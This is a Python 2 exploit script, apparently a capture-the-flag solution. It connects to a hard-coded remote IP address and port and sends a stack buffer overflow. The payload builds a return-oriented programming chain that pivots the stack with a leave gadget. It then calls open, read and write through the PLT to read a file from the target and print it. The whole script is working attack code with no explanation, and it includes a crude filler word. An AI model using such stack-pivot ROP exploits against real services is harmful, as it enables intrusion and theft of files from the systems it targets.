#!/usr/bin/env python

import socket
import struct
import string

ADDR = "210.61.8.96"
PORT = 51342

def rtil(s, c):
    buf = ""
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == c):
            break
    return buf

s = socket.create_connection((ADDR, PORT))


read_plt = struct.pack("<I", 0x080483e0)
in_bss = struct.pack("<I", 0x0804A040)
pppret = struct.pack("<I", 0x804879d)
ppret = struct.pack("<I", 0x804879d+1)

ret = struct.pack("<I", 0x80487c7)
main = struct.pack("<I", 0x0804867f)

pebp = struct.pack("<I", 0x804879f)
leave = struct.pack("<I", 0x8048733)

open_plt = struct.pack("<I", 0x08048420)
write_plt = struct.pack("<I", 0x08048450)
str_addr = struct.pack("<I", 0x80487D0)
in_data = struct.pack("<I", 0x804A038)
rloc = struct.pack("<I", 0x804A038 + 100)


buf = "\x00" * (108) 
buf += read_plt
buf += main
buf += struct.pack("<I", 0)
buf += in_data
buf += struct.pack("<I", 0x200)

buf2 = "\x00" * (80 + 20)
buf2 += pebp
buf2 += in_data
buf2 += leave
buf2 += "DDDD"
buf2 += struct.pack("<I", 0)
buf2 += in_data
buf2 += struct.pack("<I", 0x80)

s.send(buf)


rchain = "ZZZZ" +open_plt + ppret + str_addr + struct.pack("<I", 0x0)
rchain += read_plt + pppret + struct.pack("<I", 0x3) + rloc + struct.pack("<I", 0x40)
rchain += write_plt + 'F**K' + struct.pack("<I", 0x1) + rloc + struct.pack("<I", 0x40)

rchain = rchain.ljust(0x200, "A")
s.send(rchain)

s.send(buf2)

print rtil(s, "}")
